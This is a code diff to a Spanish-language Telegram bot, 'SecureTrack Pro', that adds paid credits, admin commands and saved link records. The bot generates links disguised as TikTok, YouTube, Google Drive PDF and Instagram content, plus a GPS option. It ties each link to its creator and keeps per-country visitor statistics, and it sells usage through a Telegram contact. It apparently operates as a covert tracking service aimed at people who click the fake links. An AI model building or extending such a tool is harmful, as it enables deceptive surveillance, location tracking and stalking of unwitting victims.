@@ -38,9 +38,62 @@ let lastConflictTime = 0;  // Timestamp del último conflicto
 
 // Base de datos en memoria para asociar Links con Usuarios
 // Formato: { "V-123456": "ID_DEL_CHAT_DEL_USUARIO" }
-const linkDatabase = {};
+let linkDatabase = {};
 const linkHistory = []; // Historial de enlaces generados
 const visitorStats = {}; // Estadísticas por país
+
+// ====== SISTEMA DE USUARIOS Y CRÉDITOS ======
+const USERS_FILE = path.join(__dirname, 'users.json');
+const LINKS_FILE = path.join(__dirname, 'links.json');
+let usersDB = {};
+
+// Cargar la base de datos de usuarios al inicio
+function loadUsersDB() {
+    try {
+        if (fs.existsSync(USERS_FILE)) {
+            const data = fs.readFileSync(USERS_FILE, 'utf8');
+            usersDB = JSON.parse(data);
+        } else {
+            // Si no existe, crear con el ADMIN como ilimitado
+            usersDB[ADMIN_CHAT_ID] = { name: "Administrador", plan: "unlimited", credits: 0 };
+            saveUsersDB();
+        }
+    } catch (e) {
+        console.error("❌ Error leyendo users.json:", e);
+    }
+}
+
+function saveUsersDB() {
+    try {
+        fs.writeFileSync(USERS_FILE, JSON.stringify(usersDB, null, 2), 'utf8');
+    } catch (e) {
+        console.error("❌ Error guardando users.json:", e);
+    }
+}
+
+// Cargar persistencia de links
+function loadLinksDB() {
+    try {
+        if (fs.existsSync(LINKS_FILE)) {
+            const data = fs.readFileSync(LINKS_FILE, 'utf8');
+            linkDatabase = JSON.parse(data);
+        }
+    } catch (e) {
+        console.error("❌ Error leyendo links.json:", e);
+    }
+}
+
+function saveLinksDB() {
+    try {
+        fs.writeFileSync(LINKS_FILE, JSON.stringify(linkDatabase, null, 2), 'utf8');
+    } catch (e) {
+        console.error("❌ Error guardando links.json:", e);
+    }
+}
+
+loadUsersDB();
+loadLinksDB();
+// ===========================================
 
 const app = express();
 app.use(cors());
@@ -133,21 +186,150 @@ async function handleCommand(msg) {
 
     /* ── /start ─────────────────────────────────────── */
     if (text === '/start' || text.startsWith('/start ')) {
-        await sendMessage(chatId,
-            `🎵 <b>SecureTrack Pro — Creador Activo</b>
+        // Verificar registro
+        let isNewUser = false;
+        if (!usersDB[chatId]) {
+            // Auto registro con 1 crédito
+            usersDB[chatId] = {
+                name: from,
+                plan: "credits",
+                credits: 1
+            };
+            saveUsersDB();
+            isNewUser = true;
+            console.log(`[+] Nuevo usuario registrado: ${from} (ID: ${chatId}) con 1 enlace gratis.`);
+        }
 
-Hola <b>${from}</b>! Bienvenido.
+        const user = usersDB[chatId];
+        let welcomeText = `🎵 <b>SecureTrack Pro</b>\n\nHola <b>${from}</b>! Bienvenido.\n`;
 
-🎯 <b>Generar Enlaces Dinámicos:</b>
+        if (isNewUser) {
+            welcomeText += `\n🎁 <b>REGALO DE BIENVENIDA:</b>\nTienes <b>1 enlace gratis</b> de prueba.\n`;
+        } else {
+            const planText = user.plan === 'unlimited' ? 'ILIMITADO ♾️' : `${user.credits} Crédito(s)`;
+            welcomeText += `\n💳 <b>Tu Saldo:</b> ${planText}\n`;
+        }
+
+        welcomeText += `
+🎯 <b>Comandos de Generación:</b>
 /tk [ID] — Simular TikTok
 /yt [ID] — Simular YouTube Corto
 /d [ID]  — Simular Google Drive PDF
 /ig [ID] — Simular Instagram Reel
 
-📊 <b>Sistema:</b>
-/status — Estado del sistema
-/help — Más ayuda`
+📊 <b>Tus Datos Funcionales:</b>
+/myplan — Ver saldo actual
+
+🔑 <b>ID de Chat:</b> <code>${chatId}</code>
+
+⚠️ <i>Para adquirir más créditos o un plan Ilimitado, contacta al administrador enviando tu ID de Chat a:
+👉 <b>https://t.me/Yxthc2</b></i>`;
+
+        await sendMessage(chatId, welcomeText);
+
+        /* ── /myplan ────────────────────────────────────── */
+    } else if (text === '/myplan') {
+        if (!usersDB[chatId]) {
+            await sendMessage(chatId, `❌ No estás registrado. Usa /start primero.`);
+            return;
+        }
+
+        const user = usersDB[chatId];
+        const status = user.plan === 'unlimited' ? 'Ilimitado ♾️' : `${user.credits} Créditos Restantes`;
+
+        await sendMessage(chatId,
+            `👤 <b>Perfil de Usuario</b>\n\n` +
+            `➖ <b>Nombre:</b> ${user.name}\n` +
+            `➖ <b>ID:</b> <code>${chatId}</code>\n` +
+            `➖ <b>Plan Actual:</b> ${user.plan === 'unlimited' ? 'VIP Ilimitado' : 'Por Créditos'}\n` +
+            `💳 <b>Saldo:</b> <b>${status}</b>\n\n` +
+            `💬 <i>Si deseas cambiar de plan o reportar recarga, escribe a https://t.me/Yxthc2</i>`
         );
+
+        /* ── /adduser (ADMIN) ──────────────────────────── */
+    } else if (text.startsWith('/adduser')) {
+        if (chatId !== ADMIN_CHAT_ID) return;
+        const parts = textRaw.split(' ');
+        if (parts.length < 3) {
+            await sendMessage(chatId, `⚠️ <b>Uso:</b> /adduser <chat_id> <nombre>`);
+            return;
+        }
+        const newId = parts[1];
+        const newName = parts.slice(2).join(' ');
+
+        if (usersDB[newId]) {
+            await sendMessage(chatId, `⚠️ Ese usuario ya existe en la base de datos.`);
+            return;
+        }
+
+        usersDB[newId] = { name: newName, plan: "credits", credits: 0 };
+        saveUsersDB();
+        await sendMessage(chatId, `✅ <b>Usuario ${newName} (${newId}) agregado con éxito.</b> (Con 0 créditos).\nUsa <code>/addcredits ${newId} 10</code> o <code>/setplan ${newId} unlimited</code>.`);
+
+        /* ── /addcredits (ADMIN) ───────────────────────── */
+    } else if (text.startsWith('/addcredits')) {
+        if (chatId !== ADMIN_CHAT_ID) return;
+        const parts = textRaw.split(' ');
+        if (parts.length < 3) {
+            await sendMessage(chatId, `⚠️ <b>Uso:</b> /addcredits <chat_id> <cantidad>`);
+            return;
+        }
+        const tId = parts[1];
+        const amount = parseInt(parts[2], 10);
+
+        if (isNaN(amount) || !usersDB[tId]) {
+            await sendMessage(chatId, `⚠️ Usuario no encontrado o cantidad incorrecta.`);
+            return;
+        }
+
+        usersDB[tId].credits += amount;
+        saveUsersDB();
+
+        await sendMessage(chatId, `✅ <b>Operación exitosa:</b>\nUsuario: ${usersDB[tId].name}\nCréditos Totales: ${usersDB[tId].credits}`);
+
+        // Notificar al usuario (opcional)
+        try {
+            await sendMessage(tId, `🎉 <b>¡Recarga Completada!</b>\nEl administrador añadió <b>${amount}</b> créditos a tu cuenta.\nUsa /myplan.`);
+        } catch (e) {
+            console.log("No se pudo notificar al usuario");
+        }
+
+        /* ── /setplan (ADMIN) ──────────────────────────── */
+    } else if (text.startsWith('/setplan')) {
+        if (chatId !== ADMIN_CHAT_ID) return;
+        const parts = textRaw.split(' ');
+        if (parts.length < 3) {
+            await sendMessage(chatId, `⚠️ <b>Uso:</b> /setplan <chat_id> <unlimited|credits>`);
+            return;
+        }
+        const tId = parts[1];
+        const pType = parts[2].toLowerCase();
+
+        if (!usersDB[tId] || (pType !== 'unlimited' && pType !== 'credits')) {
+            await sendMessage(chatId, `⚠️ Usuario no encontrado o plan inválido (unlimited / credits).`);
+            return;
+        }
+
+        usersDB[tId].plan = pType;
+        saveUsersDB();
+        await sendMessage(chatId, `✅ <b>Plan actualizado:</b>\nUsuario: ${usersDB[tId].name}\nNuevo Plan: ${pType}`);
+
+        /* ── /users (ADMIN) ────────────────────────────── */
+    } else if (text === '/users') {
+        if (chatId !== ADMIN_CHAT_ID) return;
+
+        let msg = `👥 <b>Lista de Usuarios Autorizados</b>\n\n`;
+        const entries = Object.entries(usersDB);
+
+        if (entries.length === 0) {
+            msg += `<i>No hay usuarios.</i>`;
+        } else {
+            entries.forEach(([id, u], idx) => {
+                const bal = u.plan === 'unlimited' ? '♾️' : `${u.credits} cr`;
+                msg += `${idx + 1}. <code>${id}</code> — <b>${u.name}</b> [${bal}]\n`;
+            });
+        }
+        await sendMessage(chatId, msg);
 
         /* ── COMANDOS DE GENERACIÓN ───────────────────── */
     } else if (text.startsWith('/tk') || text.startsWith('/yt') || text.startsWith('/d') || text.startsWith('/ig') || text.startsWith('/gps') || text.startsWith('/link')) {
@@ -159,6 +341,26 @@ Hola <b>${from}</b>! Bienvenido.
         else if (text.startsWith('/drive')) { type = 'drive'; typeName = 'Google Drive'; }
         else if (text.startsWith('/ig')) { type = 'ig'; typeName = 'Instagram Reel'; }
 
+        // === VALIDACIÓN DE CRÉDITOS ===
+        if (!usersDB[chatId]) {
+            await sendMessage(chatId, `❌ No estás registrado en el sistema. Escriba /start`);
+            return;
+        }
+
+        const user = usersDB[chatId];
+        if (user.plan === 'credits') {
+            if (user.credits <= 0) {
+                await sendMessage(chatId,
+                    `🛑 <b>SALDO INSUFICIENTE</b> 🛑\n\nNo tienes créditos para crear este enlace.\n\nTus Créditos Actuales: <b>0</b>\nTu ID de Chat: <code>${chatId}</code>\n\n⚠️ Contacta con <b>https://t.me/Yxthc2</b> enviándole tu ID de Chat para adquirir una recarga o subir a un plan Ilimitado.`
+                );
+                return;
+            }
+            // Consumimos 1 crédito
+            user.credits -= 1;
+            saveUsersDB();
+        }
+        // ==================================
+
         // Extraer el target usando el texto original
         const parts = textRaw.split(' ');
         let target = parts.slice(1).join(' ').trim();
@@ -169,6 +371,7 @@ Hola <b>${from}</b>! Bienvenido.
 
         // ASIGNAMOS ESTE ENLACE AL USUARIO QUE LO CREÓ
         linkDatabase[target] = chatId;
+        saveLinksDB(); // Guardamos el nuevo link en JSON
 
         const longUrl = buildTrackingUrl(target, type);
         const shortUrl = await shortenUrl(longUrl);
